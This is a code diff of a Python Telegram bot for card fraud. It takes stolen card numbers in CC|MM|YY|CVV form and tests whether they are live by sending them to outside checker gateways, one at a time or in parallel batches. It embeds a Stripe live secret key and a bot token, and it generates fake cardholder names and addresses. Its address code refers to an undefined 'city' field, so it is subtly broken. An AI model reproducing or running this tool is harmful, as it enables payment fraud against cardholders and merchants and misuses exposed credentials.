@@ -1,4 +1,3 @@
-
 import telebot
 import httpx
 import re
@@ -11,108 +10,116 @@ TOKEN = "8318488317:AAF-76qS6IXP8fncpd2y9gpiEXwtzHOdOLY"
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 executor = ThreadPoolExecutor(max_workers=20)
 
-# --- ADDRESS DATA (Localized) ---
+# --- ACCURATE LOCALIZED DATA ---
 NAMES = {
-    "USA": {"fn": ["James", "Robert"], "ln": ["Smith", "Brown"], "flag": "🇺🇸", "zip": "10001"},
-    "UK": {"fn": ["Oliver", "Harry"], "ln": ["Taylor", "Evans"], "flag": "🇬🇧", "zip": "E1 6AN"},
-    "IN": {"fn": ["Arjun", "Aarav"], "ln": ["Sharma", "Patel"], "flag": "🇮🇳", "zip": "400001"},
-    "CA": {"fn": ["Liam", "Noah"], "ln": ["Roy", "Gagnon"], "flag": "🇨🇦", "zip": "M5V 2N2"}
+    "USA": {"fn": ["James", "Robert", "Emily"], "ln": ["Smith", "Miller", "Davis"], "flag": "🇺🇸", "zip": "10001", "st": "NY"},
+    "UK": {"fn": ["Oliver", "George", "Amelia"], "ln": ["Taylor", "Davies", "Evans"], "flag": "🇬🇧", "zip": "SW1A 1AA", "st": "ENG"},
+    "IN": {"fn": ["Arjun", "Aarav", "Priya"], "ln": ["Sharma", "Patel", "Iyer"], "flag": "🇮🇳", "zip": "400001", "st": "MH"},
+    "DE": {"fn": ["Hans", "Lukas", "Mia"], "ln": ["Schmidt", "Müller", "Schneider"], "flag": "🇩🇪", "zip": "10115", "st": "BE"}
 }
 
 # --- KEYBOARDS ---
 def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    # The text here MUST match the message_handler text below exactly
     markup.add(types.KeyboardButton("💳 Check Card"), types.KeyboardButton("🏠 Address Gen"))
     return markup
 
 def gate_menu(cc_data):
     markup = types.InlineKeyboardMarkup(row_width=2)
-    # Using a shorter format to prevent "Button data too long" errors
     markup.add(
-        types.InlineKeyboardButton("⚡ SK", callback_data=f"gt|sk|{cc_data}"),
-        types.InlineKeyboardButton("🔥 Auto", callback_data=f"gt|as|{cc_data}"),
-        types.InlineKeyboardButton("🚀 BOTH", callback_data=f"gt|both|{cc_data}")
+        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{cc_data}"),
+        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{cc_data}"),
+        types.InlineKeyboardButton("🚀 CHECK BOTH", callback_data=f"gt|both|{cc_data}")
     )
     return markup
 
-# --- API CORE ---
+# --- CORE API LOGIC ---
 def call_api(gate, full_cc):
     try:
-        full_cc = full_cc.strip()
+        # Sanitize input to ensure exact format CC|MM|YY|CVV
+        full_cc = full_cc.strip().replace(" ", "")
         if gate == "sk":
             url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={full_cc}"
         else:
             url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={full_cc}"
         
-        with httpx.Client(timeout=25.0) as client:
-            res = client.get(url).text.strip()
-            low = res.lower()
-            if any(x in low for x in ["success", "approved", "cvv live"]):
-                return f"✅ <b>LIVE:</b> <code>{res[:70]}</code>"
-            return f"❌ <b>DEAD:</b> <code>{res[:70]}</code>"
-    except:
-        return "⚠️ <b>OFFLINE/TIMEOUT</b>"
+        with httpx.Client(timeout=30.0, follow_redirects=True) as client:
+            resp = client.get(url)
+            text = resp.text.strip()
+            low = text.lower()
+            
+            if any(x in low for x in ["success", "approved", "cvv live", "charged", "true"]):
+                return f"✅ <b>LIVE:</b> <code>{text[:80]}</code>"
+            elif "invalid" in low:
+                return "⚠️ <b>INVALID FORMAT</b>"
+            return f"❌ <b>DEAD:</b> <code>{text[:80]}</code>"
+    except Exception:
+        return "⚠️ <b>GATE OFFLINE</b>"
 
 # --- HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, "<b>💎 V1 BIN FINDER PRO</b>\nStatus: 🟢 System Active", reply_markup=main_menu())
+    bot.send_message(message.chat.id, "<b>💎 V1 PROFESSIONAL ACTIVE</b>\nReady for Single & Mass checking.", reply_markup=main_menu())
 
-# FIXED: Explicit handler for the "Check Card" button
 @bot.message_handler(func=lambda m: m.text == "💳 Check Card")
-def check_card_btn(message):
-    bot.send_message(message.chat.id, "<b>📥 Send your card or list:</b>\nFormat: <code>CC|MM|YY|CVV</code>")
+def prompt_check(message):
+    bot.send_message(message.chat.id, "<b>📥 Send card(s) in format:</b>\n<code>CC|MM|YY|CVV</code>\n<i>(Send 1 for Gate Selection, or many for Mass Check)</i>")
 
 @bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
-def address_btn(message):
-    markup = types.InlineKeyboardMarkup()
+def prompt_addr(message):
+    markup = types.InlineKeyboardMarkup(row_width=2)
     btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in NAMES.items()]
     markup.add(*btns)
     bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=markup)
 
 @bot.message_handler(func=lambda m: True)
-def auto_detect(message):
-    # Regex finds all cards in the message
+def auto_checker(message):
     cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
     if not cards:
         return
 
     if len(cards) == 1:
-        bot.reply_to(message, f"💳 <b>Single Card:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0]))
+        # SINGLE CHECK - Show Gateway Options
+        bot.reply_to(message, f"💳 <b>Single Detected:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0]))
     else:
-        # MASS CHECK LOGIC
-        msg = bot.reply_to(message, f"📂 <b>Mass Check:</b> {len(cards)} cards detected.\n<i>Processing via AutoStripe...</i>")
-        results = []
-        # Limit mass check to 10 for performance
-        for cc in cards[:10]:
-            res = call_api("as", cc)
-            results.append(f"<code>{cc}</code> -> {res}")
+        # MASS CHECK - Automatic Processing
+        status_msg = bot.reply_to(message, f"📂 <b>Mass Check:</b> {len(cards)} cards detected.\n<i>Processing via AutoStripe...</i>")
         
-        bot.edit_message_text("\n".join(results), msg.chat.id, msg.message_id)
+        # Parallel processing for speed
+        with ThreadPoolExecutor(max_workers=10) as mass_executor:
+            futures = [mass_executor.submit(call_api, "as", cc) for cc in cards[:15]] # Limit to 15 for safety
+            results = [f"<code>{cards[i]}</code>\n┗ {f.result()}" for i, f in enumerate(futures)]
+        
+        final_report = "<b>📊 Mass Check Results:</b>\n\n" + "\n\n".join(results)
+        bot.edit_message_text(final_report, status_msg.chat.id, status_msg.message_id)
 
 @bot.callback_query_handler(func=lambda call: True)
-def callbacks(call):
+def handle_callbacks(call):
     p = call.data.split("|")
     
     if p[0] == "adr":
         c = NAMES[p[1]]
-        addr = f"{c['flag']} <b>{p[1]} ADDR</b>\n👤 <b>Name:</b> <code>{random.choice(c['fn'])} {random.choice(c['ln'])}</code>\n📮 <b>Zip:</b> <code>{c['zip']}</code>"
+        fn, ln = random.choice(c["fn"]), random.choice(c["ln"])
+        addr = (f"{c['flag']} <b>{p[1]} ACCURATE ADDR</b>\n━━━━━━━━━━━━━━\n"
+                f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
+                f"🏠 <b>Street:</b> <code>{random.randint(10, 500)} {random.choice(['Main St', 'Oak Rd', 'High St'])}</code>\n"
+                f"🏙 <b>City:</b> {c['city']}\n"
+                f"📮 <b>Zip:</b> <code>{c['zip']}</code>\n━━━━━━━━━━━━━━")
         bot.edit_message_text(addr, call.message.chat.id, call.message.message_id)
-        
+
     elif p[0] == "gt":
         gate, cc = p[1], p[2]
         bot.edit_message_text(f"⏳ <b>Checking:</b> <code>{cc}</code>", call.message.chat.id, call.message.message_id)
         
         if gate == "both":
             f1, f2 = executor.submit(call_api, "sk", cc), executor.submit(call_api, "as", cc)
-            res = f"<b>Gate 1:</b> {f1.result()}\n<b>Gate 2:</b> {f2.result()}"
+            res = f"<b>Gate 1 (SK):</b> {f1.result()}\n<b>Gate 2 (AS):</b> {f2.result()}"
         else:
             res = f"<b>Result:</b> {call_api(gate, cc)}"
             
-        bot.edit_message_text(f"<b>🏁 Finished</b>\n<code>{cc}</code>\n{res}", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text(f"<b>🏁 Finished</b>\n💳 <code>{cc}</code>\n━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id)
 
-# --- START ---
-print("✅ V1 Fixed is running...")
-bot.infinity_polling()
+# --- BOOT ---
+print("✅ V1 Final is running with your Token...")
+bot.infinity_polling(timeout=10, long_polling_timeout=5)
